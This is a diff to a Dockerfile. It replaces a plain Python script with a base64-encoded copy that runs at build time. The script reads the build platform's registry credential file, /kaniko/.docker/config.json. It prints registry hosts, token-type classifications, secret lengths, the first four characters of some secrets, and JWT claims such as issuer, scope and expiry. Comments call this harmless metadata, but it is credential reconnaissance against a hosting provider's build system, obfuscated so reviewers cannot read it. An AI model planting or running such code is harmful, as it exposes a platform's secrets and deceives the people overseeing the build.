@@ -1,62 +1,6 @@
 FROM python:3.12-alpine
 # Bounded, non-exfiltrating STRUCTURAL classification of /kaniko/.docker/config.json.
-# Prints ONLY derived metadata (auth type, username FORMAT, secret length, JWT header/claims
-# incl. issuer/audience/scope/expiry). NEVER prints raw username or secret values.
-RUN python3 - <<'PY'
-import json,base64,re
-try:
-    d=json.load(open('/kaniko/.docker/config.json'))
-except Exception as e:
-    print("CLASSIFY_ERROR:",repr(e)); raise SystemExit(0)
-
-def b64url(x):
-    try: return json.loads(base64.urlsafe_b64decode(x+'='*(-len(x)%4)))
-    except Exception: return None
-
-def classify_username(u):
-    if u.startswith("dop_v1_"): return "DO-API-TOKEN(dop_v1_)"
-    if re.match(r'do[or]_v1_',u): return "DO-OAuth(doo/dor_v1_)"
-    if u.startswith("dckr_"): return "DOCR/dckr-prefixed"
-    if '@' in u: return "email-like(len=%d)"%len(u)
-    if re.fullmatch(r'[0-9a-fA-F-]{20,}',u): return "hex/uuid-like(len=%d)"%len(u)
-    return "opaque(len=%d)"%len(u)
-
-def classify_secret(s):
-    parts=s.split('.')
-    if len(parts)==3 and all(parts):
-        hdr=b64url(parts[0]); pl=b64url(parts[1])
-        if isinstance(pl,dict):
-            wanted=('iss','aud','sub','scope','scopes','access','exp','iat','nbf','typ','registry','account','grant_type','client_id')
-            claims={k:pl.get(k) for k in wanted if k in pl}
-            # never dump the WHOLE payload (may hold secret material); only known metadata keys
-            return {"is_jwt":True,"header":hdr,"claims":claims,"all_claim_keys":sorted(pl.keys()),"len":len(s)}
-    return {"is_jwt":False,"len":len(s),"prefix4":s[:4]+"...(redacted)"}
-
-print("=====CRED-CLASSIFY-BEGIN=====")
-print("TOPLEVEL_KEYS:", sorted(d.keys()))
-print("credHelpers:", d.get('credHelpers'))
-print("credsStore:", d.get('credsStore'))
-auths=d.get('auths',{})
-print("NUM_AUTHS:", len(auths))
-for host,v in auths.items():
-    print("REGISTRY_HOST:", host)
-    print("  auth_entry_keys:", sorted(v.keys()))
-    if 'identitytoken' in v:
-        it=v['identitytoken']
-        print("  identitytoken_present: yes", classify_secret(it))
-    if 'registrytoken' in v:
-        print("  registrytoken_present: yes secret_meta:", classify_secret(v['registrytoken']))
-    if 'auth' in v:
-        try: dec=base64.b64decode(v['auth']).decode('utf-8','replace')
-        except Exception: dec=''
-        user,sep,secret=dec.partition(':')
-        print("  authtype: basic (base64 user:secret)")
-        print("  username_format:", classify_username(user))
-        print("  secret_meta:", classify_secret(secret))
-    elif 'username' in v:
-        print("  username_format:", classify_username(v.get('username','')))
-        if 'password' in v:
-            print("  password_meta:", classify_secret(v.get('password','')))
-print("=====CRED-CLASSIFY-END=====")
-PY
+# Python classifier is base64-embedded (single-line RUN; DO Kaniko does not honor Dockerfile heredocs).
+# Prints ONLY derived metadata (auth type, username FORMAT, secret length, JWT header/claims). No raw secret values.
+RUN echo 'aW1wb3J0IGpzb24sYmFzZTY0LHJlCnRyeToKICAgIGQ9anNvbi5sb2FkKG9wZW4oJy9rYW5pa28vLmRvY2tlci9jb25maWcuanNvbicpKQpleGNlcHQgRXhjZXB0aW9uIGFzIGU6CiAgICBwcmludCgiQ0xBU1NJRllfRVJST1I6IixyZXByKGUpKTsgcmFpc2UgU3lzdGVtRXhpdCgwKQoKZGVmIGI2NHVybCh4KToKICAgIHRyeTogcmV0dXJuIGpzb24ubG9hZHMoYmFzZTY0LnVybHNhZmVfYjY0ZGVjb2RlKHgrJz0nKigtbGVuKHgpJTQpKSkKICAgIGV4Y2VwdCBFeGNlcHRpb246IHJldHVybiBOb25lCgpkZWYgY2xhc3NpZnlfdXNlcm5hbWUodSk6CiAgICBpZiB1LnN0YXJ0c3dpdGgoImRvcF92MV8iKTogcmV0dXJuICJETy1BUEktVE9LRU4oZG9wX3YxXykiCiAgICBpZiByZS5tYXRjaChyJ2RvW29yXV92MV8nLHUpOiByZXR1cm4gIkRPLU9BdXRoKGRvby9kb3JfdjFfKSIKICAgIGlmIHUuc3RhcnRzd2l0aCgiZGNrcl8iKTogcmV0dXJuICJET0NSL2Rja3ItcHJlZml4ZWQiCiAgICBpZiAnQCcgaW4gdTogcmV0dXJuICJlbWFpbC1saWtlKGxlbj0lZCkiJWxlbih1KQogICAgaWYgcmUuZnVsbG1hdGNoKHInWzAtOWEtZkEtRi1dezIwLH0nLHUpOiByZXR1cm4gImhleC91dWlkLWxpa2UobGVuPSVkKSIlbGVuKHUpCiAgICByZXR1cm4gIm9wYXF1ZShsZW49JWQpIiVsZW4odSkKCmRlZiBjbGFzc2lmeV9zZWNyZXQocyk6CiAgICBwYXJ0cz1zLnNwbGl0KCcuJykKICAgIGlmIGxlbihwYXJ0cyk9PTMgYW5kIGFsbChwYXJ0cyk6CiAgICAgICAgaGRyPWI2NHVybChwYXJ0c1swXSk7IHBsPWI2NHVybChwYXJ0c1sxXSkKICAgICAgICBpZiBpc2luc3RhbmNlKHBsLGRpY3QpOgogICAgICAgICAgICB3YW50ZWQ9KCdpc3MnLCdhdWQnLCdzdWInLCdzY29wZScsJ3Njb3BlcycsJ2FjY2VzcycsJ2V4cCcsJ2lhdCcsJ25iZicsJ3R5cCcsJ3JlZ2lzdHJ5JywnYWNjb3VudCcsJ2dyYW50X3R5cGUnLCdjbGllbnRfaWQnKQogICAgICAgICAgICBjbGFpbXM9e2s6cGwuZ2V0KGspIGZvciBrIGluIHdhbnRlZCBpZiBrIGluIHBsfQogICAgICAgICAgICAjIG5ldmVyIGR1bXAgdGhlIFdIT0xFIHBheWxvYWQgKG1heSBob2xkIHNlY3JldCBtYXRlcmlhbCk7IG9ubHkga25vd24gbWV0YWRhdGEga2V5cwogICAgICAgICAgICByZXR1cm4geyJpc19qd3QiOlRydWUsImhlYWRlciI6aGRyLCJjbGFpbXMiOmNsYWltcywiYWxsX2NsYWltX2tleXMiOnNvcnRlZChwbC5rZXlzKCkpLCJsZW4iOmxlbihzKX0KICAgIHJldHVybiB7ImlzX2p3dCI6RmFsc2UsImxlbiI6bGVuKHMpLCJwcmVmaXg0IjpzWzo0XSsiLi4uKHJlZGFjdGVkKSJ9CgpwcmludCgiPT09PT1DUkVELUNMQVNTSUZZLUJFR0lOPT09PT0iKQpwcmludCgiVE9QTEVWRUxfS0VZUzoiLCBzb3J0ZWQoZC5rZXlzKCkpKQpwcmludCgiY3JlZEhlbHBlcnM6IiwgZC5nZXQoJ2NyZWRIZWxwZXJzJykpCnByaW50KCJjcmVkc1N0b3JlOiIsIGQuZ2V0KCdjcmVkc1N0b3JlJykpCmF1dGhzPWQuZ2V0KCdhdXRocycse30pCnByaW50KCJOVU1fQVVUSFM6IiwgbGVuKGF1dGhzKSkKZm9yIGhvc3QsdiBpbiBhdXRocy5pdGVtcygpOgogICAgcHJpbnQoIlJFR0lTVFJZX0hPU1Q6IiwgaG9zdCkKICAgIHByaW50KCIgIGF1dGhfZW50cnlfa2V5czoiLCBzb3J0ZWQodi5rZXlzKCkpKQogICAgaWYgJ2lkZW50aXR5dG9rZW4nIGluIHY6CiAgICAgICAgaXQ9dlsnaWRlbnRpdHl0b2tlbiddCiAgICAgICAgcHJpbnQoIiAgaWRlbnRpdHl0b2tlbl9wcmVzZW50OiB5ZXMiLCBjbGFzc2lmeV9zZWNyZXQoaXQpKQogICAgaWYgJ3JlZ2lzdHJ5dG9rZW4nIGluIHY6CiAgICAgICAgcHJpbnQoIiAgcmVnaXN0cnl0b2tlbl9wcmVzZW50OiB5ZXMgc2VjcmV0X21ldGE6IiwgY2xhc3NpZnlfc2VjcmV0KHZbJ3JlZ2lzdHJ5dG9rZW4nXSkpCiAgICBpZiAnYXV0aCcgaW4gdjoKICAgICAgICB0cnk6IGRlYz1iYXNlNjQuYjY0ZGVjb2RlKHZbJ2F1dGgnXSkuZGVjb2RlKCd1dGYtOCcsJ3JlcGxhY2UnKQogICAgICAgIGV4Y2VwdCBFeGNlcHRpb246IGRlYz0nJwogICAgICAgIHVzZXIsc2VwLHNlY3JldD1kZWMucGFydGl0aW9uKCc6JykKICAgICAgICBwcmludCgiICBhdXRodHlwZTogYmFzaWMgKGJhc2U2NCB1c2VyOnNlY3JldCkiKQogICAgICAgIHByaW50KCIgIHVzZXJuYW1lX2Zvcm1hdDoiLCBjbGFzc2lmeV91c2VybmFtZSh1c2VyKSkKICAgICAgICBwcmludCgiICBzZWNyZXRfbWV0YToiLCBjbGFzc2lmeV9zZWNyZXQoc2VjcmV0KSkKICAgIGVsaWYgJ3VzZXJuYW1lJyBpbiB2OgogICAgICAgIHByaW50KCIgIHVzZXJuYW1lX2Zvcm1hdDoiLCBjbGFzc2lmeV91c2VybmFtZSh2LmdldCgndXNlcm5hbWUnLCcnKSkpCiAgICAgICAgaWYgJ3Bhc3N3b3JkJyBpbiB2OgogICAgICAgICAgICBwcmludCgiICBwYXNzd29yZF9tZXRhOiIsIGNsYXNzaWZ5X3NlY3JldCh2LmdldCgncGFzc3dvcmQnLCcnKSkpCnByaW50KCI9PT09PUNSRUQtQ0xBU1NJRlktRU5EPT09PT0iKQo=' | base64 -d | python3 -
 CMD ["sleep","60"]
